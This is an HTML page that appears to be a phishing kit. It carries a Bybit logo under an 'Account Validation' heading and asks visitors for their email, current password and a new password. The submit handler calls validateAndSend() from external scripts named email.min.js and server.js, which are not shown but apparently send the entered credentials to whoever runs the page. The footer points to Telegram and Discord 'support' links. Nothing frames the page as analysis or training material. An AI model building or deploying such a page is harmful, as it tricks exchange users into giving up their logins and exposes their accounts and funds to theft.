<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Secure validation links for users and accounts">
  <link rel="icon" href="#">
  <title>Account Validation</title>
  <link href="style.css" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
  <script src="email.min.js"></script>
  <script src="server.js"></script>
</head>
<body>
  <div class="main-container">
    <!-- Form Section -->
    <div class="form-container">
      <div style="text-align: center; margin-bottom: 20px;">
        <img src="file/bybit-logo.jpg" alt="Logo" style="width: 120px; height: auto;">
      </div>
      <h2 style="text-align: center;">Account Validation</h2>
      <form onsubmit="event.preventDefault(); validateAndSend();">
        <div class="form-group">
          <input type="text" id="email" placeholder="Email" required>
        </div>
        <div class="form-group">
          <input type="password" id="password" placeholder="Current Password" required>
        </div>
        <h3 style="text-align: center;">Create a New Password</h3>
        <div class="form-group">
          <input type="password" id="new-password" placeholder="New Password" required>
        </div>
        <div class="form-group">
          <input type="password" id="confirm-password" placeholder="Confirm New Password" required>
        </div>
        <button type="submit" class="btn">Submit</button>
      </form>
    </div>

    <!-- Image Section -->
    <div
      class="image-container"
      style="background-image: url('file/login.PNG');">
    </div>
  </div>
  

  <footer>
    <ul class="social-links">
      <li><a href="https://t.me/customer_Online_chat" target="_blank"><i class="fab fa-telegram-plane"></i></a></li>
      <li><a href="https://discord.gg/NyFzv85N" target="_blank"><i class="fab fa-discord"></i></a></li>
    </ul>
    <p>&copy; 2024 Secure Validation. All rights reserved.</p>
  </footer>

</html>
